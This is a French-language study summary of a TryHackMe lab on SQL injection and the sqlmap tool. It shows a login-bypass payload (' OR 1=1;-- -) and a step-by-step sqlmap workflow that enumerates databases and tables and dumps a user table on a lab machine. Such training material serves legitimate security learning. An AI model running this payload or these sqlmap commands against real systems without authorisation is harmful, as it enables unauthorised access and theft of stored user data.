
# 🐍 SQLMap – Introduction aux Injections SQL

> Ce document est une synthèse du module *SQLMap: The Basics* de TryHackMe, rédigée en français. Il couvre les bases des injections SQL, l'utilisation de l'outil SQLMap et propose un exercice pratique.

---

## 🎯 Objectifs d'apprentissage

* Comprendre le concept d'injection SQL
* Apprendre à utiliser SQLMap pour automatiser les attaques
* Mettre en pratique les connaissances acquises sur une application vulnérable

---

## 🧠 Introduction aux Injections SQL

Une injection SQL est une technique d'attaque qui permet à un attaquant d'interférer avec les requêtes SQL que l'application envoie à sa base de données.

Par exemple, une requête classique de connexion pourrait ressembler à :

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

Un attaquant pourrait manipuler cette requête en entrant :

- **Nom d'utilisateur** : John
- **Mot de passe** : abc' OR 1=1;-- -

Ce qui transformerait la requête en :

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

L'opérateur `OR 1=1` est toujours vrai, permettant ainsi à l'attaquant d'accéder sans connaître le mot de passe réel.

---

## 🛠️ Utilisation de SQLMap

SQLMap est un outil en ligne de commande qui automatise le processus de détection et d'exploitation des vulnérabilités d'injection SQL.

### 🔍 Tester une URL vulnérable

Pour tester une URL, utilisez la commande suivante :

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" --dbs
```

- `-u` : Spécifie l'URL cible
- `--dbs` : Enumère les bases de données disponibles

### 📋 Extraire des tables d'une base de données

Pour extraire les tables de la base de données `members` :

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" -D members --tables
```

- `-D` : Spécifie la base de données cible
- `--tables` : Enumère les tables de la base de données

---

## 🧪 Exercice Pratique

1. Démarrer la machine virtuelle et accéder à la page de connexion à l'adresse :

   ```
   http://MACHINE_IP/ai/login
   ```

2. Soumettre des identifiants fictifs pour capturer la requête GET, par exemple :

   - **Email** : test
   - **Mot de passe** : test

3. Observer la requête GET résultante, qui devrait ressembler à :

   ```
   http://MACHINE_IP/ai/includes/user_login?email=test&password=test
   ```

4. Utiliser SQLMap pour tester la vulnérabilité :

   ```bash
   sqlmap -u "http://MACHINE_IP/ai/includes/user_login?email=test&password=test" --level=5
   ```

   - `--level=5` : Augmente la profondeur des tests effectués

5. Répondre aux invites de SQLMap :

   - Ignorer les tests pour d'autres SGBD : **y**
   - Inclure tous les tests spécifiques à MySQL : **y**
   - Tester d'autres paramètres si `email` est vulnérable : **n**

6. Une fois la vulnérabilité confirmée, utiliser les commandes suivantes pour explorer la base de données :

   - Lister les bases de données :

     ```bash
     sqlmap -u "http://MACHINE_IP/ai/includes/user_login?email=test&password=test" --dbs
     ```

   - Lister les tables de la base `ai` :

     ```bash
     sqlmap -u "http://MACHINE_IP/ai/includes/user_login?email=test&password=test" -D ai --tables
     ```

   - Extraire les données de la table `user` :

     ```bash
     sqlmap -u "http://MACHINE_IP/ai/includes/user_login?email=test&password=test" -D ai -T user --dump
     ```

---

## 🧠 Concepts Clés

* **Injection SQL** : Technique permettant d'exécuter des requêtes SQL malveillantes via des entrées utilisateur non sécurisées.
* **SQLMap** : Outil automatisé pour détecter et exploiter les vulnérabilités d'injection SQL.
* **Paramètres importants de SQLMap** :
  - `-u` : Spécifie l'URL cible.
  - `--dbs` : Enumère les bases de données.
  - `-D` : Spécifie la base de données cible.
  - `--tables` : Enumère les tables de la base de données.
  - `--dump` : Extrait les données des tables.
